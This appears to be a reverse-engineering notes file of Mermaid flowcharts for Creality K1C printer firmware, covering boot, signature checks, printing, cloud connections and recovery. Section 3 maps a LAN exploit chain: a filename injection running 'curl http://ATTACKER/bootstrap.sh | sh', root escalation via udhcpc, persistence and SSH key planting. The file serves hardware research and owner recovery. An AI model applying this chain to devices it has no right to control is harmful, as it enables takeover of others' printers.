# Creality K1C 2025 — Flow Diagrams

## 1. Boot Flow (POWER → READY)

```mermaid
flowchart TD
    A([POWER ON]) --> B[U-Boot SPL\neMMC offset 0x4600\nencrypted]
    B --> C[U-Boot 2013.07\nencrypted\nloads kernel from mmcblk0p5]
    C --> D[Linux 5.10.186\nMIPS32 LE\ninitramfs → RAM]
    D --> E[/linuxrc\nbusybox init\nreads /etc/inittab]
    E --> F[/etc/init.d/rcS]
    F --> G[S10mdev\ndevice manager]
    G --> H[S20urandom\nRNG seed]
    H --> I[S30dbus]
    I --> J[S40network\nlo interface]
    J --> K[S50dropbear\nSSH on port 22]
    K --> L[. /bin/seed.sh\nsourced in rcS shell]
    L --> M[seed.sh\nsee seed.sh flow]
    M --> N[run_system_service\nS??* as root]
    N --> O[run_creality_service\nCS??* as creality]
    O --> P([SYSTEM READY])

    style A fill:#2d2d2d,color:#fff
    style P fill:#1a5c1a,color:#fff
    style K fill:#1a3a5c,color:#fff
    style L fill:#5c3a1a,color:#fff
```

---

## 2. seed.sh Execution

```mermaid
flowchart TD
    A([seed.sh start]) --> B[insmod soc_security.ko\nregisters /dev/sc]
    B --> C[wait_system\npoll for /dev/mmcblk0]
    C --> D[mount_do_userdata\nfsck + mount mmcblk0p10\n→ /usr/data]
    D --> E{upg_do\nupgrade pending?}
    E -->|state file exists| F[cmd_sc -v upgfile\nverify OTA package]
    F --> G[upgbox -U -f upgfile\nflash partitions]
    G --> H([reboot])
    E -->|no upgrade| I[do_reset_clean\nprocess clean_list if present]
    I --> J[decrypt_sn_mac\ncmd_sc mmcblk0p2\n→ /tmp/params]
    J --> K[mount_do_deplibs\ncmd_sc -v mmcblk0p7\neFuse + RSA + AES verify]
    K -->|FAIL| L([halt ← BRICK POINT])
    K -->|PASS| M[losetup + mount squashfs\n→ /usr/deplibs]
    M --> N[mount_do_apps\nmount mmcblk0p8 ext4\n→ /usr/apps]
    N --> O[verify_apps\ncmd_sc decrypt each .bin\n→ /tmp/apps/\nalchemistp nexusp onyxp\nquintusp thirteenthp\nsolusp vectorp mdns]
    O -->|any FAIL| L
    O -->|all PASS| P[check_login_permission\n/usr/data/permission exists?\ncmd_sc -v verify\nMAC match → unlock shadow]
    P --> Q[chattr +i /tmp/shadow\nlocks shadow immutable]
    Q --> R[init_sys_date\nread /usr/apps/etc/buildtime]
    R --> S[run_system_service\n/etc/appetc/init.d/S??*\nas root]
    S --> T[run_creality_service\n/etc/appetc/init.d/CS??*\nas creality user]
    T --> U([seed.sh complete])

    style A fill:#2d2d2d,color:#fff
    style L fill:#8b0000,color:#fff
    style H fill:#8b0000,color:#fff
    style U fill:#1a5c1a,color:#fff
    style K fill:#5c3a1a,color:#fff
```

---

## 3. WebSocket RCE Exploit Flow

```mermaid
flowchart TD
    A([Attacker\nLAN access]) --> B[python3 k1c-2025-exploit.py\n--host-ip ATTACKER\n--printer-ip PRINTER\n--public-key id_ecdsa.pub]
    B --> C[Start HTTP server\nport 4444\nserving payloads]
    B --> D[WebSocket connect\nws://PRINTER:9999\nsubprotocol: wsslicer]
    D --> E[Send JSON\nmethod: set\nparams.print: http://ATTACKER/exploit-TIME]
    E --> F[vectorp\nprint_proc\nservice_httpchunk_request]
    F --> G[Printer fetches\nhttp://ATTACKER/exploit-TIME]
    G --> H[Server responds\nContent-Disposition: filename=\ndest';curl http://ATTACKER/bootstrap.sh | sh;#.gcode]
    H --> I[Shell injection\nin filename handling]
    I --> J[Printer fetches\n/bootstrap.sh]
    J --> K[wget /privesc.py\nudhcpc -s /tmp/privesc.py]
    K --> L[udhcpc runs privesc.py\nas ROOT\nCAP_NET_ADMIN]
    L --> M[wget /S999persistence\nchmod +x\nexec S999persistence]
    M --> N[mkdir /root/.ssh\nchmod 700\necho PUBLIC_KEY\n→ authorized_keys]
    N --> O[dropbearkey gen\nhost keys]
    O --> P[chattr -i /tmp/shadow\nsed unlock root account]
    P --> Q([SSH root@PRINTER\nauthenticated])

    style A fill:#2d2d2d,color:#fff
    style Q fill:#1a5c1a,color:#fff
    style L fill:#5c1a1a,color:#fff
    style I fill:#5c3a1a,color:#fff
```

---

## 4. Print Flow (Touch → Motion)

```mermaid
flowchart TD
    A([User touches\nscreen]) --> B[vectorp\nLVGL UI\n/tmp/apps/vectorp]
    B --> C[Select gcode file\nfrom /usr/data/printer_data/gcodes]
    C --> D[wsKlipper::sendGcodeFile\nvia solusp IPC]
    D --> E[solusp\n/tmp/apps/solusp]
    E --> F[wsKlipper class\nUnix socket /tmp/klippy_uds]
    F --> G[Klipper\npython klippy.py\nrunning as creality]
    G --> H[Parse gcode\nsequence planning]
    H --> I[Serial commands\nto MCU]
    I --> J[MCU\ntoolhead microcontroller]
    J --> K[Stepper drivers\nX Y Z E motion]
    J --> L[Hotend heater\ntemperature control]
    J --> M[Bed heater\ntemperature control]
    J --> N[Part cooling fan\nspeed control]
    G --> O[Status updates\nvia klippy_uds]
    O --> E
    E --> P[IPC → vectorp\nlayer count, temps, %]
    P --> B

    B2[nexusp\nport 7125] --> G
    B3[Fluidd/Mainsail\nbrowser :4408/:4409] --> B2

    style A fill:#2d2d2d,color:#fff
    style J fill:#1a3a5c,color:#fff
```

---

## 5. Cloud Phone-Home Flow

```mermaid
flowchart TD
    subgraph Printer
        V[vectorp]
        A[alchemistp]
        O[onyxp]
        T[thirteenthp]
        M[mdns]
    end

    subgraph Creality Cloud
        MQTT[mqtt.crealitycloud.cn\nmqtt.crealitycloud.com\nport 1883 plaintext]
        API[api.crealitycloud.cn\napi.crealitycloud.com\nHTTPS]
        WRT[admin-pre.crealitycloud.cn\nWebRTC signaling WSS]
        OSS[Alibaba OSS\nlog + timelapse upload]
        UNK[58.48.202.36\nhardcoded IP\nUNKNOWN PURPOSE]
    end

    subgraph LAN
        DEV[Other LAN devices\nmDNS discovery]
    end

    V -->|publish: cx_machine.system_info\ncx_machine.proc_stats| MQTT
    V -->|device register\nfirmware list\nowner binding| API
    V -->|Alibaba STS credentials\nlog + timelapse files| OSS
    A -->|unknown protocol| UNK
    O -->|WebRTC signaling\nJWT auth| WRT
    T -->|DTLS/SRTP\nmedia stream| WRT
    M -->|UDP broadcast\n_Creality-SN._udp.local| DEV

    style UNK fill:#8b0000,color:#fff
    style MQTT fill:#5c3a1a,color:#fff
    style Printer fill:#1a1a2e,color:#fff
    style Creality Cloud fill:#2d1a1a,color:#fff
```

---

## 6. Recovery Flow (Software Path)

```mermaid
flowchart TD
    A([mmcblk0p7 corrupted\nor verification fails]) --> B[seed.sh\nmount_do_deplibs\ncmd_sc -v FAILS]
    
    subgraph Current Behavior
        B --> C([halt\nBRICK — no recovery])
    end

    subgraph Patched Behavior
        B --> D[log warning\ncontinue without halt]
        D --> E[mount attempt\nsquashfs may still mount\nif data intact]
        E --> F[mount_do_apps\n/usr/apps still mounts]
        F --> G[S999persistence runs\nfrom /usr/apps/etc/init.d/]
        G --> H[Recovery dropbear starts\nfrom /usr/apps/bin/dropbear]
        H --> I([SSH root access\nover LAN])
        I --> J[dd restore from backup\nmmcblk0p7 from eMMC image]
        J --> K[reboot]
        K --> L([Normal boot\nrecovered])
    end

    subgraph Requirements
        R1[Modified seed.sh\nhalt removed]
        R2[Kernel repacked\nwith new initramfs]
        R3[Signed with own RSA key\nvia soc_security.ko bypass]
        R4[Flashed to mmcblk0p5]
        R5[dropbear copy\nin /usr/apps/bin/]
        R6[eMMC backup\non host machine]
    end

    style A fill:#8b0000,color:#fff
    style C fill:#8b0000,color:#fff
    style L fill:#1a5c1a,color:#fff
    style I fill:#1a3a5c,color:#fff
```
